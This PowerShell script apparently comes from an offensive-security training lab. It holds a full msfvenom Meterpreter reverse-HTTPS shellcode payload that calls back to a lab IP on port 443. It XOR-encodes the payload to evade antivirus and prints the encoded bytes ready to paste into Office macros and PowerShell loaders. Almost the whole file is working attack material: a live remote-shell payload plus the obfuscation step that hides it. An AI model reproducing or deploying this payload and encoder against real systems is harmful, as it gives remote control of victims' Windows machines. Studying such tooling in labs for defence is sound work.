function Format-ByteArrayToInt($Bytes, $VarName) {
    $element = ''
    for ($count = 0; $count -lt $Bytes.Count; $count++) 
    {
        [Byte]$b = $Bytes[$count]
        if (($count + 1) -eq $Bytes.Length) 
        {
            # If this is the last byte don't append a comma
            $element += $b
        } 
        Else 
        {
            $element += "{0}," -f $b
        }
        
        # Let's keep the output clean so only 15 bytes are in a row
        if (($count + 1) % 49 -eq 0)
        {
            $element += " _{0}" -f "`n"
        }
    }
    # Output the elements into a format we can just copy/paste for later use
    $formatted = '{0} = Array({1})' -f $VarName, $element  
    return $formatted
}

function Format-ByteArrayToPS1($Bytes, $VarName) {
    $element = ''
    for ($count = 0; $count -lt $Bytes.Count; $count++) 
    {

        [Byte]$b = $Bytes[$count]
        if (($count + 1) -eq $Bytes.Length) 
        {
            # If this is the last byte don't append a comma
            $element += "0x{0:x}" -f $b
        } 
        Else 
        {
            $element += "0x{0:x}," -f $b
        }
        
    }
    # Output the elements into a format we can just copy/paste for later use
    $formatted = '[Byte[]] ${0} = {1}' -f $VarName, $element  
    return $formatted
}


# Generate a random shift value
$xKey = 0x55


#root@kali:/osep/r2/c2# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.179 LPORT=443 EXITFUNC=thread -f ps1 -v payload
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x64 from the payload
#No encoder specified, outputting raw payload
#Payload size: 733 bytes
#Final size of ps1 file: 3592 bytes
[Byte[]] $payload = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xf,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,0x2e,0x31,0x37,0x39,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xb2,0x0,0x0,0x0,0x2f,0x58,0x63,0x59,0x51,0x6f,0x69,0x7a,0x68,0x75,0x4b,0x38,0x6b,0x6a,0x79,0x57,0x4e,0x52,0x79,0x30,0x41,0x50,0x77,0x48,0x71,0x52,0x72,0x57,0x68,0x77,0x6d,0x67,0x43,0x49,0x6f,0x49,0x6e,0x4e,0x31,0x68,0x48,0x55,0x66,0x70,0x67,0x46,0x36,0x2d,0x6c,0x54,0x6b,0x33,0x4a,0x68,0x67,0x47,0x5f,0x64,0x4f,0x52,0x4b,0x6f,0x2d,0x49,0x55,0x58,0x79,0x63,0x57,0x50,0x6d,0x66,0x49,0x38,0x62,0x4a,0x41,0x32,0x78,0x44,0x64,0x52,0x55,0x66,0x74,0x49,0x6e,0x4c,0x65,0x38,0x59,0x4f,0x68,0x70,0x62,0x6c,0x65,0x78,0x2d,0x79,0x69,0x53,0x42,0x37,0x6a,0x73,0x5f,0x6b,0x48,0x41,0x6a,0x44,0x68,0x2d,0x4a,0x4e,0x46,0x5f,0x56,0x33,0x73,0x42,0x71,0x65,0x7a,0x54,0x72,0x52,0x6c,0x5f,0x54,0x56,0x59,0x67,0x55,0x51,0x67,0x36,0x79,0x79,0x57,0x74,0x65,0x39,0x43,0x49,0x4a,0x30,0x44,0x41,0x78,0x7a,0x32,0x38,0x62,0x57,0x6e,0x44,0x4c,0x52,0x30,0x71,0x37,0x67,0x33,0x46,0x71,0x4a,0x67,0x75,0x77,0x45,0x61,0x44,0x44,0x31,0x32,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5





# Encrypt by shifting to the right (+) but you can go in either direction to start then encrypt with XOR
[Byte[]]$encBytes = @();
for ($i = 0; $i -lt $payload.Count; $i++) {
    $encBytes += (($payload[$i] -band 0xFF) -bxor $xKey[0])
} 

# Decrypt XOR then shift to the left (-) as long as it's the opposite of what you shifted to start
[Byte[]]$decBytes = @();
for ($i = 0; $i -lt $encBytes.Count; $i++) {
    $decBytes += (($encBytes[$i] -bxor $xKey[0]) -band 0xFF)
}

# Format our byte array into a variable format we can use later
$raw = Format-ByteArrayToInt -Bytes $payload -VarName OffSec
$enc = Format-ByteArrayToInt -Bytes $encBytes -VarName Says
$dec = Format-ByteArrayToInt -Bytes $decBytes -VarName TryHarder

$ps1raw = Format-ByteArrayToPS1 -Bytes $payload -VarName buf
$ps1enc = Format-ByteArrayToPS1 -Bytes $encBytes -VarName buf
$ps1dec = Format-ByteArrayToPS1 -Bytes $decBytes -VarName buf

# Print results
Write-Host "`n[******************* PAYLOADS FOR MACROS *********************"
Write-Host "`n[*] XOR Key:"
Write-Host $xKey

Write-Host "`n[*] Raw Bytes:"
Write-Host $raw

Write-Host "`n[*] Encrypted Bytes"
Write-Host $enc

Write-Host "`n[*] Decrypted Bytes"
Write-Host $dec

Write-Host "`n[******************* PAYLOADS FOR PS1 *********************"
Write-Host "`n[*] Raw Bytes:"
Write-Host $ps1raw

Write-Host "`n[*] Encrypted Bytes"          
Write-Host $ps1enc

Write-Host "`n[*] Decrypted Bytes"
Write-Host $ps1dec
